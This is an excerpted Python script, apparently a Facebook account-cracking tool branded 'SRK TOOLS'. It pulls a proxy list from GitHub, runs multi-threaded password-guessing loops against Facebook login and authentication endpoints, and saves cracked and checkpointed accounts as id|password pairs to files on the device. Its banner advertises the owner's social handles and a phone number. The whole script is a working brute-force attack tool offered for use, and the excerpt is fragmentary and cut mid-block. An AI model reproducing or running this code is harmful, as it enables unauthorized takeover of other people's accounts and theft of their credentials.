...
print('\n\033[1;32m   Join SRK   Group ');time.sleep(1)
os.system("")
print('\n\033[1;36m   WELCOME TO SRK   TOOLS...');time.sleep(3)
...
try:
    prox= requests.get('https://raw.githubusercontent.com/BestProfessionals/MUSLISRK  /main/.prox.txt').text
...
(_)  (_)    (_____)    (_)
----------------------------------------
\033[1;37m [•] \033[1;37mOwner     :   Crack Pro 
 [•] Facebook  :\033[1;37m   Crack.boy.143
 [•] Github    :\033[1;37m   Crack143
 [•] Tool      :\033[1;37m   FREE 
 [•] What's up :\033[1;37m   03014542473
...
def login():
        ...
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 11; VIVO V2028 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
...
def file_cloning():
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print("\033[1;32m [+] OK IDZ SAVE ✓ SRK  -OK.txt")
                                        print("\033[1;32m [+] CP IDZ SAVE × SRK  -CP.txt")
...
def afgan():
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;97m [+]\033[1;32m OK IDZ SAVE ✓ SRK  -OK.txt")
                        print("\033[1;97m [+]\033[1;32m CP IDZ SAVE × SRK  -CP.txt")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SRK  -F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AWM:
                                ...
                                print('\r\r\033[1;32m [SRK-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SRK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SRK-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SRK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SRK  -F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SRK  -OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SRK  -OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SRK  -R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SRK  -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SRK  -OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/SRK  -OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SRK  -OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SRK  -OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
